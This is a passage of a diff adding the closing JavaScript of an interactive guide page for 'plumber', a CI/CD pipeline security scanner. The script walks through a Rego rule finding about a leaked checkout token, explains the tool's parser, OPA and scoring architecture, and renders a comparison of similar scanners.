+      {t:'}',c:'rego-active-line'},
+    ],
+    input:[
+      {t:'// All conditions matched.',c:'hl-dim'},{t:'// Finding emitted:',c:'hl-dim'},{t:'',c:''},
+      {t:'{',c:''},{t:'  "severity": "low",',c:'rego-active-line'},
+      {t:'  "message": "Token written to .git/config",',c:'rego-active-line'},
+      {t:'  "fix": "add persist-credentials: false",',c:'rego-active-line'},
+      {t:'  "location": "ci.yml:8"',c:'rego-active-line'},{t:'}',c:''},
+    ],
+    explain:'<strong>Step 5 of 5 — Finding emitted.</strong><br><br>All conditions passed. OPA adds the finding to the result set. Plumber collects findings from all rules across all 9 risk categories, calculates the score, and prints the report. The fix: add <code>persist-credentials: false</code> to the checkout step. One line. The rule finds nothing next time.'
+  }
+];
+var regoIdx=0;
+function renderRego(){
+  document.getElementById('rego-rule').innerHTML=regoSteps[regoIdx].rule.map(function(l){return l.c?'<span class="'+l.c+'">'+esc(l.t)+'</span>':esc(l.t);}).join('\n');
+  document.getElementById('rego-input').innerHTML=regoSteps[regoIdx].input.map(function(l){return l.c?'<span class="'+l.c+'">'+esc(l.t)+'</span>':esc(l.t);}).join('\n');
+  document.getElementById('rego-explain').innerHTML=regoSteps[regoIdx].explain;
+  document.getElementById('rego-indicator').textContent='Step '+(regoIdx+1)+' of '+regoSteps.length;
+  document.getElementById('rego-prev').disabled=regoIdx===0;
+  document.getElementById('rego-next').disabled=regoIdx===regoSteps.length-1;
+}
+function regoStep(dir){regoIdx=Math.max(0,Math.min(regoSteps.length-1,regoIdx+dir));renderRego();}
+renderRego();
+
+// ── Architecture ──────────────────────────────────────────────────────────────
+var archData={
+  yaml:{icon:'📄',title:'Your Workflow Files',body:'The raw YAML files in <code>.github/workflows/</code> (GitHub Actions) or <code>.gitlab-ci.yml</code> (GitLab CI). Plumber reads these directly &mdash; no CI run required, works offline and in pre-commit hooks.',files:'Input: .github/workflows/*.yml or .gitlab-ci.yml'},
+  parser:{icon:'🔍',title:'Go Parser',body:'Provider-specific parsers convert YAML into typed Go structs. The GitHub parser understands Actions syntax. The GitLab parser understands GitLab CI syntax including includes, rules, and variables. Each parser resolves defaults so rules see a complete picture.',files:'Files: github/github_workflows.go, gitlab/gitlab_ci.go'},
+  ir:{icon:'🧱',title:'NormalizedPipeline (the key insight)',body:'Both parsers write into a common data shape &mdash; one struct that represents any pipeline, regardless of platform. This is what makes plumber unique: write a rule once and it works on both GitHub Actions and GitLab CI without modification.',files:'Files: internal/ir/pipeline.go'},
+  opa:{icon:'⚖️',title:'OPA Engine',body:'Open Policy Agent is the industry-standard policy evaluation engine (also used by Kubernetes and Terraform). Plumber feeds the NormalizedPipeline as JSON into OPA and asks it to evaluate all rules simultaneously. OPA returns every finding in one pass.',files:'Files: internal/engine/opa/'},
+  rules:{icon:'📋',title:'Rules across 9 risk categories',body:'Each rule is a readable file in the open-source repo. Categories: container/image security, variable injection, secrets handling, pipeline structure, branch and MR protection, platform governance, supply chain, triggers and permissions, ecosystem hygiene.',files:'Files: policies/*.rego — one file per rule'},
+  output:{icon:'📊',title:'Score and Findings',body:'Findings are scored using an attack-path model: how likely is this to be exploited, and what is the impact? The result is an A&ndash;E letter score. Output formats: terminal, SARIF (GitHub Code Scanning), JSON, PBOM (Pipeline Bill of Materials), GitLab SAST.',files:'Formats: SARIF, JSON, PBOM, GitLab SAST, CycloneDX, CSV'},
+};
+function showArch(id){
+  var detail=document.getElementById('arch-detail');
+  document.querySelectorAll('.arch-box').forEach(function(b){b.classList.remove('active');});
+  document.querySelector('.arch-box[onclick*="\''+id+'\'"]').classList.add('active');
+  var d=archData[id];
+  document.getElementById('arch-d-icon').textContent=d.icon;
+  document.getElementById('arch-d-title').textContent=d.title;
+  document.getElementById('arch-d-body').innerHTML=d.body;
+  document.getElementById('arch-d-files').innerHTML='<code style="font-size:.75rem;color:var(--rw-text-subtle);background:none;border:none;padding:0;">'+d.files+'</code>';
+  detail.classList.add('open');
+}
+
+// ── Vendor comparison ─────────────────────────────────────────────────────────
+var vendors=[
+  {name:'getplumber',tagline:'Purpose-built CI/CD security scanner',featured:true,caps:{github:true,gitlab:true,free:true,scoring:true,runtime:false,gate:true}},
+  {name:'zizmor',tagline:'Rust-based GitHub Actions linter',caps:{github:true,gitlab:false,free:true,scoring:false,runtime:false,gate:false}},
+  {name:'actionlint',tagline:'Syntax checker for GitHub Actions',caps:{github:true,gitlab:false,free:true,scoring:false,runtime:false,gate:false}},
+  {name:'Harden-Runner',tagline:'Runtime monitoring for GitHub Actions',caps:{github:true,gitlab:false,free:'part',scoring:false,runtime:true,gate:false}},
+  {name:'Semgrep',tagline:'SAST with GitHub Actions rule bundle',caps:{github:true,gitlab:'part',free:'part',scoring:false,runtime:false,gate:false}},
+];
+var capLabels={github:'GitHub Actions',gitlab:'GitLab CI',free:'Free / no account',scoring:'Attack-path scoring',runtime:'Runtime monitoring',gate:'Block CI (score gate)'};
+function capIcon(v){if(v===true)return '<span class="cap-yes">✓</span>';if(v===false)return '<span class="cap-no">✗</span>';return '<span class="cap-part">◐</span>';}
+var activeFilter='all';
+function filterVendors(f,btn){
+  activeFilter=f;
+  document.querySelectorAll('.filter-chip').forEach(function(c){c.classList.remove('active');});
+  btn.classList.add('active');
+  renderVendors();
+}
+function renderVendors(){
+  var grid=document.getElementById('vendor-grid'); grid.innerHTML='';
+  vendors.forEach(function(v){
+    var matches=activeFilter==='all'||v.caps[activeFilter]===true||v.caps[activeFilter]==='part';
+    var card=document.createElement('div');
+    card.className='vendor-card'+(v.featured?' featured':'')+((!matches)?' dim-card':'');
+    var caps=Object.keys(capLabels).map(function(k){return '<div class="vendor-cap">'+capIcon(v.caps[k])+'<span>'+capLabels[k]+'</span></div>';}).join('');
+    card.innerHTML='<div class="vendor-name">'+(v.featured?'&#11088; ':'')+v.name+'</div><div class="vendor-tagline">'+v.tagline+'</div><div class="vendor-caps">'+caps+'</div>';
+    grid.appendChild(card);
+  });
+}
+renderVendors();
+
+// ── OS toggle ─────────────────────────────────────────────────────────────────
+function showOS(os,btn){
+  document.querySelectorAll('.os-btn').forEach(function(b){b.classList.remove('active');});
+  btn.classList.add('active');
+  document.getElementById('os-mac').style.display=os==='mac'?'':'none';
+  document.getElementById('os-win').style.display=os==='win'?'':'none';
+}
+
+// ── Copy buttons ──────────────────────────────────────────────────────────────
+function copyCode(id,btn){
+  var el=document.getElementById(id); if(!el)return;
+  navigator.clipboard.writeText(el.textContent.trim()).then(function(){
+    btn.textContent='copied!'; setTimeout(function(){btn.textContent='copy';},1800);
+  });
+}
+
+// ── TOC scrollspy ─────────────────────────────────────────────────────────────
+(function(){
+  var sections=document.querySelectorAll('.guide-section[id]');
+  var links=document.querySelectorAll('.guide-toc a');
+  var navH=parseInt(getComputedStyle(document.documentElement).getPropertyValue('--rw-nav-height')||'56',10);
+  function update(){
+    var scroll=window.scrollY+navH+20,active=null;
+    sections.forEach(function(s){if(s.offsetTop<=scroll)active=s.id;});
+    links.forEach(function(a){a.classList.toggle('active',a.getAttribute('href')==='#'+active);});
+  }
+  window.addEventListener('scroll',update,{passive:true}); update();
+})();
+</script>
+</body>
+</html>
